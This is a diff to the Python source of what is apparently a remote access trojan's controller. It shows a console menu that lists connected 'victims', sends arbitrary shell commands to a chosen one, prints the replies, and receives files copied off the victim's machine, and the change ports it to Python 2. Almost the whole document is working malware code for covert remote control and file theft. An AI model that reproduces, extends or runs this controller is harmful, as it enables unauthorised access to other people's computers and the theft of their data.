@@ -45,21 +45,21 @@ class Server:
 
     def run(self):
 
-        threading.Thread(target=self.accept_connections, daemon=True).start()
+        tt = threading.Thread(target=self.accept_connections).start()
         while True:
             print("Items to do:\n")
             print("1) Refresh connections.")
             print("2) Inspect a victim.")
             print("0) Exit.\n")
 
-            option = input("What u want to do? ")
+            option = raw_input("What u want to do? ")
 
             if option == "1":
                 os.system('clear')
                 self.refresh_connections()
 
             elif option == "2":
-                client_id = input("Choose wisely: ")
+                client_id = raw_input("Choose wisely: ")
                 os.system('clear')
                 try:
                     with self.locking:
@@ -67,12 +67,13 @@ class Server:
                     FileBrowser(client).run()
                 except IndexError:
                     print("Index does not exist. \n")
+
             elif option == "0":
                 self.close_connections()
                 sys.exit(0)
             else:
                 print("\nPerhaps you better start from the beginning.")
-                input("")
+                raw_input("")
                 os.system("clear")
 
 
@@ -88,7 +89,7 @@ class FileBrowser:
         while True:
             l = self.client.socket.recv(4096)
             while (l):
-                if l.endswith(bytes("EOFX", "UTF-8")):
+                if l.endswith("EOFX"):
                     u = l[:-4]
                     f.write(u)
                     break
@@ -100,23 +101,23 @@ class FileBrowser:
 
     def run(self):
 
-        self.client.socket.sendall(bytes("1", "UTF-8"))
-        client_pwd = self.client.socket.recv(4096).decode("UTF-8")
+        self.client.socket.sendall("1")
+        client_pwd = self.client.socket.recv(4096)
         print(client_pwd)
         exit = False
         while not exit:
-            command = input("Type a command: ")
+            command = raw_input("Type a command: ")
             if command == "exit":
-                self.client.socket.sendall(bytes(command, "UTF-8"))
+                self.client.socket.sendall(command)
                 exit = True
                 os.system("clear")
             elif command == "clear":
                 os.system("clear")
             else:
-                self.client.socket.sendall(bytes(command, "UTF-8"))
+                self.client.socket.sendall(command)
                 if command.startswith("cp"):
                     self.file_transfer()
-                received = self.client.socket.recv(4096).decode("UTF-8")
+                received = self.client.socket.recv(4096)
                 print(received)
 
 
@@ -132,6 +133,6 @@ class Client:
         self.socket.close()
 
     def sync(self):
-        self.socket.sendall(bytes("2", "UTF-8"))
+        self.socket.sendall("2")
         self.username = self.socket.recv(1024).decode("UTF-8")
         return True
